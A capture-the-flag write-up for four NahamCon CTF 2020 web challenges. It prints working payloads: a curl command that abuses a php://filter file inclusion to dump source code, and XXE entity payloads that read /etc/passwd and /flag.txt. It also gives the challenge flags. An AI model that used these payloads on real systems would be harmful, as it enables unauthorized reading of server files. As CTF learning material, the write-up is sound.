# NahamCon CTF 2020
`oH5U4No` `350 pts` `1151/2854`

> 2020-06-12T23:00:00 - 2020-06-14T06:00:00  
> https://ctf.nahamcon.com/  
> 0

Only participate 4 hours.


## Writeup


### Agent 95
`Web` `50 pts` `flag{user_agents_undercover}`

> They've given you a number, and taken away your name~
> 
> Connect here:  
> http://jh2i.com:50000

The page give a hint that they only give flag to the agent 95, and he
    is still running an old version of Windows.
The hint give us a thought that we need to use Windows 95.

There is a header `User-Agent`.
We can set `User-Agent` to `Mozilla/4.0 (compatible; MSIE 5.5; Windows 95; BCD2000)`
    and get the flag.


### Localghost
`Web` `75 pts` `JCTF{spoooooky_ghosts_in_storage}`

> BooOooOooOOoo! This spooOoOooky client-side cooOoOode sure is scary! What spoOoOoOoky secrets does he have in stooOoOoOore??
> 
> Connect here:  
> http://jh2i.com:50003
> 
> **Note, this flag is not in the usual format.**

The last word `stooOoOoOore` give a hint that the flag store in the 
    local storage, which can be accessed from `chrome inspect >
    Application > Local Storage > http://jh2i.com:50003`.


### Phphonebook
`Web` `100 pts` `flag{phon3_numb3r_3xtr4ct3d}`

> Ring ring! Need to look up a number? This phonebook has got you covered! But you will only get a flag if it is an emergency!
> 
> Connect here:  
> http://jh2i.com:50002

The page give a link `/index.php/?file=`, which can use to get file.
It also tell us a page `/phphonebook.php`.

The first thing is to get the source code.

```php
$ curl 'http://jh2i.com:50002/index.php?file=php://filter/convert.base64-encode/resource=phphonebook.php' | base64 -d
---------------------------------------------------------------------------------------------------------------------
...
<?php
  extract($_POST);

  if (isset($emergency)){
    echo(file_get_contents("/flag.txt"));
  }
?>
...
```

Then we know the flag is at `/flag.txt` and we can get the flag by
    sending a POST request with parameter `emergency`.


### Extraterrestrial
`Web` `125 pts` `flag{extraterrestrial_extra_entities}`

> Have you seen any aliens lately? Let us know!
> 
> The flag is at the start of the solar system.
> 
> Connect here:  
> http://jh2i.com:50004

At first, we try to input some content, and the response is
    `Invalud document end`.
Then we think that it might need to input structral content, which
    might be xml.
We try to input `<xml></xml>` and it response normally.

We may use XXE vulnerability to get the flag.
We try to access `/etc/passwd` and work.

```xml
<!DOCTYPE xxe[
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

We then try to access `/flag` and got forbidden.

```xml
<!DOCTYPE xxe[
<!ENTITY xxe SYSTEM "file:///flag">
]>
<root>&xxe;</root>
------------------
PEReference: forbidden within markup decl in internal subset
```

We then try to use `php://filter` to encode the flag and success.

```
<!DOCTYPE test[
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
]>
<root>&xxe;</root>
------------------
array(1) {
  ["xxe"]=>
  string(52) "ZmxhZ3tleHRyYXRlcnJlc3RyaWFsX2V4dHJhX2VudGl0aWVzfQo="
}
```
